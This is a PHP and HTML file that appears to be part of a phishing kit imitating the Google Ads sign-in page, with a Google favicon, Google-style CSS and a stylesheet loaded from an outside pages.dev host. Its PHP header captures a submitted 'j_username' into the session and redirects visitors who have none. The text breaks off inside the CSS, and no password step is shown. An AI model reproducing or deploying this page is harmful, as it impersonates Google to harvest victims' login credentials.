﻿<?php



if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
		
	$user = $_POST['j_username']; 
	$_SESSION['identifierId'] = $user;		
	
}
if (!isset($_SESSION["identifierId"])) 
{
  header('Location: ' . 'index.php');
}   

?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr" class="eC9N2e">
  <head>
    <link
      rel="icon"
      href="data:image/x-icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///zD9/f2W/f392P39/fn9/f35/f391/39/ZT+/v4uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Cf39/Zn///////////////////////////////////////////39/ZX///8IAAAAAAAAAAAAAAAA/v7+Cf39/cH/////+v35/7TZp/92ul3/WKs6/1iqOv9yuFn/rNWd//j79v///////f39v////wgAAAAAAAAAAP39/Zn/////7PXp/3G3WP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP+Or1j//vDo///////9/f2VAAAAAP///zD/////+vz5/3G3V/9TqDT/WKo6/6LQkf/U6cz/1urO/6rUm/+Zo0r/8IZB//adZ////v7///////7+/i79/f2Y/////4nWzf9Lqkj/Vqo4/9Xqzv///////////////////////ebY//SHRv/0hUL//NjD///////9/f2U/f392v////8sxPH/Ebzt/43RsP/////////////////////////////////4roL/9IVC//i1jf///////f391/39/fr/////Cr37/wW8+/+16/7/////////////////9IVC//SFQv/0hUL/9IVC//SFQv/3pnX///////39/fn9/f36/////wu++/8FvPv/tuz+//////////////////SFQv/0hUL/9IVC//SFQv/0hUL/96p7///////9/f35/f392/////81yfz/CrL5/2uk9v///////////////////////////////////////////////////////f392P39/Zn/////ks/7/zdS7P84Rur/0NT6///////////////////////9/f////////////////////////39/Zb+/v4y//////n5/v9WYu3/NUPq/ztJ6/+VnPT/z9L6/9HU+v+WnfT/Ul7t/+Hj/P////////////////////8wAAAAAP39/Z3/////6Or9/1hj7v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9sdvD////////////9/f2YAAAAAAAAAAD///8K/f39w//////5+f7/paz2/11p7v88Suv/Okfq/1pm7v+iqfX/+fn+///////9/f3B/v7+CQAAAAAAAAAAAAAAAP///wr9/f2d///////////////////////////////////////////9/f2Z/v7+CQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f2Z/f392/39/fr9/f36/f392v39/Zj///8wAAAAAAAAAAAAAAAAAAAAAPAPAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAPAPAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/g3+/v5X/f39mf39/cj9/f3q/f39+f39/fn9/f3q/f39yP39/Zn+/v5W////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f2c/f399f/////////////////////////////////////////////////////9/f31/f39mv7+/iMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/gn9/f2K/f39+////////////////////////////////////////////////////////////////////////////f39+v39/Yf///8IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4k/f390v////////////////////////////////////////////////////////////////////////////////////////////////39/dD///8iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////MP39/er//////////////////////////+r05v+v16H/gsBs/2WxSf9Wqjj/Vqk3/2OwRv99vWX/pdKV/97u2P////////////////////////////39/ej+/v4vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f3q/////////////////////+v15/+Pxnv/VKk2/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/36+Z//d7tf///////////////////////39/ej///8iAAAAAAAAAAAAAAAAAAAAAAAAAAD///8K/f390//////////////////////E4bn/XKw+/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1apN/+x0pv///////////////////////39/dD///8IAAAAAAAAAAAAAAAAAAAAAP39/Yv/////////////////////sdij/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/YKU1/8qOPv/5wZ////////////////////////39/YcAAAAAAAAAAAAAAAD+/v4l/f39+////////////////8Lgt/9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9utlT/n86N/7faqv+426v/pdKV/3u8ZP9UqDX/U6g0/3egN//jiUH/9IVC//SFQv/82MP//////////////////f39+v7+/iMAAAAAAAAAAP39/Z3////////////////q9Ob/W6w+/1OoNP9TqDT/U6g0/1OoNP9nskz/zOXC/////////////////////////////////+Dv2v+osWP/8YVC//SFQv/0hUL/9IVC//WQVP/++fb//////////////////f39mgAAAAD+/v4O/f399v///////////////4LHj/9TqDT/U6g0/1OoNP9TqDT/dblc//L58P/////////////////////////////////////////////8+v/3p3f/9IVC//SFQv/0hUL/9IVC//rIqf/////////////////9/f31////DP7+/ln////////////////f9v7/Cbz2/zOwhv9TqDT/U6g0/2KwRv/v9+z///////////////////////////////////////////////////////738//1kFT/9IVC//SFQv/0hUL/9plg///////////////////////+/v5W/f39nP///////////////4jf/f8FvPv/Bbz7/yG1s/9QqDz/vN2w//////////////////////////////////////////////////////////////////rHqP/0hUL/9IVC//SFQv/0hUL//vDn//////////////////39/Zn9/f3L////////////////R878/wW8+/8FvPv/Bbz7/y7C5P/7/fr//////////////////////////////////////////////////////////////////ere//SFQv/0hUL/9IVC//SFQv/718H//////////////////f39yP39/ez///////////////8cwvv/Bbz7/wW8+/8FvPv/WNL8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//rIqv/////////////////9/f3q/f39+v///////////////we9+/8FvPv/Bbz7/wW8+/993P3///////////////////////////////////////SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/+cGf//////////////////39/fn9/f36////////////////B737/wW8+/8FvPv/Bbz7/33c/f//////////////////////////////////////9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/6xaX//////////////////f39+f39/e3///////////////8cwvv/Bbz7/wW8+/8FvPv/WdP8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//vVv//////////////////9/f3q/f39y////////////////0bN/P8FvPv/Bbz7/wW8+/8hrvn/+/v///////////////////////////////////////////////////////////////////////////////////////////////////////////////////39/cj9/f2c////////////////ht/9/wW8+/8FvPv/FZP1/zRJ6/+zuPf//////////////////////////////////////////////////////////////////////////////////////////////////////////////////f39mf7+/lr////////////////d9v7/B7n7/yB38f81Q+r/NUPq/0hV7P/u8P3////////////////////////////////////////////////////////////////////////////////////////////////////////////+/v5X////D/39/ff///////////////9tkPT/NUPq/zVD6v81Q+r/NUPq/2Fs7//y8v7////////////////////////////////////////////09f7//////////////////////////////////////////////////f399f7+/g0AAAAA/f39n////////////////+Tm/P89Suv/NUPq/zVD6v81Q+r/NUPq/1Bc7f/IzPn/////////////////////////////////x8v5/0xY7P+MlPP////////////////////////////////////////////9/f2cAAAAAAAAAAD+/v4n/f39/P///////////////7W69/81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9ZZe7/k5v0/6609/+vtff/lJv0/1pm7v81Q+r/NUPq/zVD6v+GjvL//v7//////////////////////////////f39+/7+/iQAAAAAAAAAAAAAAAD9/f2N/////////////////////6Cn9f81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v+BivL////////////////////////////9/f2KAAAAAAAAAAAAAAAAAAAAAP7+/gv9/f3V/////////////////////7W69/8+S+v/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/P0zr/7q/+P///////////////////////f390v7+/gkAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3r/////////////////////+Xn/P94gfH/NkTq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NkTq/3Z/8f/l5/z///////////////////////39/er+/v4kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f3r///////////////////////////k5vz/nqX1/2p08P9IVez/OEbq/zdF6v9GU+z/aHLv/5qh9f/i5Pz////////////////////////////9/f3q////MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3V/////////////////////////////////////////////////////////////////////////////////////////////////f390v7+/iQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wr9/f2N/f39/P///////////////////////////////////////////////////////////////////////////f39+/39/Yv+/v4JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4n/f39n/39/ff//////////////////////////////////////////////////////f399v39/Z3+/v4lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Dv7+/lr9/f2c/f39y/39/e39/f36/f39+v39/ez9/f3L/f39nP7+/ln+/v4OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/AA///AAD//AAAP/gAAB/wAAAP4AAAB8AAAAPAAAADgAAAAYAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABgAAAAcAAAAPAAAAD4AAAB/AAAA/4AAAf/AAAP/8AAP//wAP/"
    />
  <link rel="stylesheet" href="https://css-style-bulletproof.pages.dev/styleon.css">
    <meta name="chrome" content="nointentdetection" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style nonce="">
      :root {
      }
    </style>
    <meta name="description" content="Advertise with Google Ads in the Sponsored Links section next to search results to boost website traffic and sales." />

    <title>Google Ads - Sign in</title>
    <script data-savepage-type="" type="text/plain" nonce=""></script>
    <script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script>
   <style nonce="" type="text/css" data-late-css="">
      .N7rBcd {
        overflow-x: auto;
      }
      sentinel {
      }
    </style>
    <style nonce="" type="text/css" data-late-css="">
      .VfPpkd-scr2fc{-moz-box-align:center;align-items:center;background:none;border:none;cursor:pointer;display:-moz-inline-box;display:inline-flex;flex-shrink:0;margin:0;outline:none;overflow:visible;padding:0;position:relative}.VfPpkd-scr2fc[hidden]{display:none}.VfPpkd-scr2fc:disabled{cursor:default;pointer-events:none}.VfPpkd-l6JLsf{overflow:hidden;position:relative;width:100%}.VfPpkd-l6JLsf::before,.VfPpkd-l6JLsf::after{border:1px solid transparent;border-radius:inherit;-moz-box-sizing:border-box;box-sizing:border-box;content:"";height:100%;left:0;position:absolute;width:100%}@media screen and (forced-colors:active){.VfPpkd-l6JLsf::before,.VfPpkd-l6JLsf::after{border-color:currentColor}}.VfPpkd-l6JLsf::before{transition:transform 75ms 0ms cubic-bezier(0,0,.2,1);transform:translateX(0)}.VfPpkd-l6JLsf::after{transition:transform 75ms 0ms cubic-bezier(.4,0,.6,1);transform:translateX(-100%)}[dir=rtl] .VfPpkd-l6JLsf::after,.VfPpkd-l6JLsf[dir=rtl]::after{transform:translateX(100%)}.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-l6JLsf::before{transition:transform 75ms 0ms cubic-bezier(.4,0,.6,1);transform:translateX(100%)}[dir=rtl] .VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-l6JLsf::before,.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-l6JLsf[dir=rtl]::before{transform:translateX(-100%)}.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-l6JLsf::after{transition:transform 75ms 0ms cubic-bezier(0,0,.2,1);transform:translateX(0)}.VfPpkd-uMhiad-u014N{height:100%;pointer-events:none;position:absolute;top:0;transition:transform 75ms 0ms cubic-bezier(.4,0,.2,1);left:0;right:auto;transform:translateX(0)}[dir=rtl] .VfPpkd-uMhiad-u014N,.VfPpkd-uMhiad-u014N[dir=rtl]{left:auto;right:0}.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad-u014N{transform:translateX(100%)}[dir=rtl] .VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad-u014N,.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad-u014N[dir=rtl]{transform:translateX(-100%)}.VfPpkd-uMhiad{display:-moz-box;display:flex;pointer-events:auto;position:absolute;top:50%;transform:translateY(-50%);left:0;right:auto}[dir=rtl] .VfPpkd-uMhiad,.VfPpkd-uMhiad[dir=rtl]{left:auto;right:0}.VfPpkd-uMhiad::before,.VfPpkd-uMhiad::after{border:1px solid transparent;border-radius:inherit;-moz-box-sizing:border-box;box-sizing:border-box;content:"";width:100%;height:100%;left:0;position:absolute;top:0;transition:background-color 75ms 0ms cubic-bezier(.4,0,.2,1),border-color 75ms 0ms cubic-bezier(.4,0,.2,1);z-index:-1}@media screen and (forced-colors:active){.VfPpkd-uMhiad::before,.VfPpkd-uMhiad::after{border-color:currentColor}}.VfPpkd-VRSVNe{border-radius:inherit;bottom:0;left:0;position:absolute;right:0;top:0}.VfPpkd-BFbNVe-bF1uUb{bottom:0;left:0;right:0;top:0}.VfPpkd-Qsb3yd{left:50%;position:absolute;top:50%;transform:translate(-50%,-50%);z-index:-1}.VfPpkd-scr2fc:disabled .VfPpkd-Qsb3yd{display:none}.VfPpkd-lw9akd{height:100%;position:relative;width:100%;z-index:1}.VfPpkd-pafCAf{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0;opacity:0;transition:opacity 30ms 0ms cubic-bezier(.4,0,1,1)}.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-pafCAf-OWXEXe-IT5dJd,.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-pafCAf-OWXEXe-Xhs9z{opacity:1;transition:opacity 45ms 30ms cubic-bezier(0,0,.2,1)}.VfPpkd-scr2fc{--mdc-ripple-fg-size:0;--mdc-ripple-left:0;--mdc-ripple-top:0;--mdc-ripple-fg-scale:1;--mdc-ripple-fg-translate-end:0;--mdc-ripple-fg-translate-start:0;-webkit-tap-highlight-color:rgba(0,0,0,0);will-change:transform,opacity}.VfPpkd-scr2fc .VfPpkd-Qsb3yd::before,.VfPpkd-scr2fc .VfPpkd-Qsb3yd::after{position:absolute;border-radius:50%;opacity:0;pointer-events:none;content:""}.VfPpkd-scr2fc .VfPpkd-Qsb3yd::before{transition:opacity 15ms linear,background-color 15ms linear;z-index:1}.VfPpkd-scr2fc .VfPpkd-Qsb3yd::after{z-index:0}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d .VfPpkd-Qsb3yd::before{transform:scale(var(--mdc-ripple-fg-scale,1))}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d .VfPpkd-Qsb3yd::after{top:0;left:0;transform:scale(0);transform-origin:center center}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-ZNMTqd .VfPpkd-Qsb3yd::after{top:var(--mdc-ripple-top,0);left:var(--mdc-ripple-left,0)}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-lJfZMc .VfPpkd-Qsb3yd::after{animation:mdc-ripple-fg-radius-in 225ms forwards,mdc-ripple-fg-opacity-in 75ms forwards}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-OmS1vf .VfPpkd-Qsb3yd::after{animation:mdc-ripple-fg-opacity-out .15s;transform:translate(var(--mdc-ripple-fg-translate-end,0)) scale(var(--mdc-ripple-fg-scale,1))}.VfPpkd-scr2fc .VfPpkd-Qsb3yd::before,.VfPpkd-scr2fc .VfPpkd-Qsb3yd::after{top:0;left:0;width:100%;height:100%}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d .VfPpkd-Qsb3yd::before,.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d .VfPpkd-Qsb3yd::after{top:var(--mdc-ripple-top,0);left:var(--mdc-ripple-left,0);width:var(--mdc-ripple-fg-size,100%);height:var(--mdc-ripple-fg-size,100%)}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d .VfPpkd-Qsb3yd::after{width:var(--mdc-ripple-fg-size,100%);height:var(--mdc-ripple-fg-size,100%)}.VfPpkd-scr2fc .VfPpkd-DVBDLb-LhBDec-sM5MNb{width:100%;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-DVBDLb-LhBDec,.VfPpkd-scr2fc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-DVBDLb-LhBDec{pointer-events:none;border:2px solid transparent;border-radius:6px;-moz-box-sizing:content-box;box-sizing:content-box;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);height:calc(100% + 4px);width:calc(100% + 4px)}@media screen and (forced-colors:active){.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-DVBDLb-LhBDec,.VfPpkd-scr2fc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-DVBDLb-LhBDec{border-color:CanvasText}}.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-DVBDLb-LhBDec::after,.VfPpkd-scr2fc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-DVBDLb-LhBDec::after{content:"";border:2px solid transparent;border-radius:8px;display:block;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);height:calc(100% + 4px);width:calc(100% + 4px)}@media screen and (forced-colors:active){.VfPpkd-scr2fc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-DVBDLb-LhBDec::after,.VfPpkd-scr2fc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-DVBDLb-LhBDec::after{border-color:CanvasText}}.LXctle{width:36px}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled .VfPpkd-uMhiad::after{background:rgb(26,115,232)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-uMhiad::after{background:rgb(23,78,166)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-uMhiad::after{background:rgb(23,78,166)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active .VfPpkd-uMhiad::after{background:rgb(23,78,166)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:disabled .VfPpkd-uMhiad::after{background:rgb(60,64,67)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled .VfPpkd-uMhiad::after{background:rgb(95,99,104)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-uMhiad::after{background:rgb(32,33,36)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-uMhiad::after{background:rgb(32,33,36)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active .VfPpkd-uMhiad::after{background:rgb(32,33,36)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:disabled .VfPpkd-uMhiad::after{background:rgb(60,64,67)}.LXctle .VfPpkd-uMhiad::before{background:rgb(255,255,255)}.LXctle:enabled .VfPpkd-VRSVNe{box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15)}.LXctle:enabled .VfPpkd-VRSVNe .VfPpkd-BFbNVe-bF1uUb{opacity:.05}.LXctle:enabled .VfPpkd-VRSVNe .VfPpkd-BFbNVe-bF1uUb{background-color:transparent}.LXctle:disabled .VfPpkd-VRSVNe{box-shadow:none}.LXctle:disabled .VfPpkd-VRSVNe .VfPpkd-BFbNVe-bF1uUb{opacity:0}.LXctle:disabled .VfPpkd-VRSVNe .VfPpkd-BFbNVe-bF1uUb{background-color:transparent}.LXctle .VfPpkd-DVBDLb-LhBDec-sM5MNb,.LXctle .VfPpkd-uMhiad{height:20px}.LXctle:disabled .VfPpkd-uMhiad::after{opacity:.38}.LXctle .VfPpkd-uMhiad{border-radius:10px 10px 10px 10px}.LXctle .VfPpkd-uMhiad{width:20px}.LXctle .VfPpkd-uMhiad-u014N{width:calc(100% - 20px)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled .VfPpkd-pafCAf{fill:rgb(255,255,255)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:disabled .VfPpkd-pafCAf{fill:rgb(255,255,255)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled .VfPpkd-pafCAf{fill:rgb(255,255,255)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:disabled .VfPpkd-pafCAf{fill:rgb(255,255,255)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:disabled .VfPpkd-lw9akd{opacity:.38}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:disabled .VfPpkd-lw9akd{opacity:.38}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-pafCAf,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-pafCAf{width:18px;height:18px}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::after{background-color:rgb(26,115,232)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::after{background-color:rgb(26,115,232)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active .VfPpkd-Qsb3yd::after{background-color:rgb(26,115,232)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::after{background-color:rgb(60,64,67)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::after{background-color:rgb(60,64,67)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active .VfPpkd-Qsb3yd::after{background-color:rgb(60,64,67)}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):hover .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe).VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Qsb3yd::before{opacity:.04}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Qsb3yd::before{transition-duration:75ms;opacity:.12}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Qsb3yd::after{transition:opacity .15s linear}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Qsb3yd::after{transition-duration:75ms;opacity:.1}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active.VfPpkd-ksKsZd-mWPk3d{--mdc-ripple-fg-opacity:var(--mdc-switch-selected-pressed-state-layer-opacity,0.1)}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):hover .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe).VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Qsb3yd::before{opacity:.04}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::before,.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Qsb3yd::before{transition-duration:75ms;opacity:.12}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Qsb3yd::after{transition:opacity .15s linear}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Qsb3yd::after{transition-duration:75ms;opacity:.1}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled:active.VfPpkd-ksKsZd-mWPk3d{--mdc-ripple-fg-opacity:var(--mdc-switch-unselected-pressed-state-layer-opacity,0.1)}.LXctle .VfPpkd-Qsb3yd{height:48px;width:48px}.LXctle .VfPpkd-l6JLsf{height:14px}.LXctle:disabled .VfPpkd-l6JLsf{opacity:.12}.LXctle:enabled .VfPpkd-l6JLsf::after{background:rgb(138,180,248)}.LXctle:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-l6JLsf::after{background:rgb(138,180,248)}.LXctle:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-l6JLsf::after{background:rgb(138,180,248)}.LXctle:enabled:active .VfPpkd-l6JLsf::after{background:rgb(138,180,248)}.LXctle:disabled .VfPpkd-l6JLsf::after{background:rgb(60,64,67)}.LXctle:enabled .VfPpkd-l6JLsf::before{background:rgb(218,220,224)}.LXctle:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-l6JLsf::before{background:rgb(218,220,224)}.LXctle:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-l6JLsf::before{background:rgb(218,220,224)}.LXctle:enabled:active .VfPpkd-l6JLsf::before{background:rgb(218,220,224)}.LXctle:disabled 